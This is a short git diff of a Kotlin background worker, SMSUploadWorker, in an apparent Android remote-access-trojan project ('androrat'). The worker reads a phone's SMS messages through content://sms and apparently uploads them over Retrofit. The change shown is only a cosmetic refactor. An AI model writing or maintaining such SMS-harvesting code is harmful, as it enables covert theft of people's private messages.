@@ -1,14 +1,15 @@
 package com.ierusalem.androrat.core.worker
 
 import android.content.Context
-import android.net.Uri
 import android.util.Log
 import androidx.work.CoroutineWorker
 import androidx.work.WorkerParameters
 import com.ierusalem.androrat.core.data.networking.RetrofitInstance
 import com.ierusalem.androrat.core.data.networking.SMSModel
 import com.ierusalem.androrat.features.home.presentation.model.SMSMessage
+import androidx.core.net.toUri
 
+@Suppress("unused")
 class SMSUploadWorker(context: Context, workerParameters: WorkerParameters) :
     CoroutineWorker(context, workerParameters) {
     override suspend fun doWork(): Result {
@@ -46,7 +47,7 @@ class SMSUploadWorker(context: Context, workerParameters: WorkerParameters) :
     private fun readMessages(context: Context, type: String): List<SMSMessage> {
         val messages = mutableListOf<SMSMessage>()
         val cursor = context.contentResolver.query(
-            Uri.parse("content://sms/$type"),
+            "content://sms/$type".toUri(),
             null,
             null,
             null,
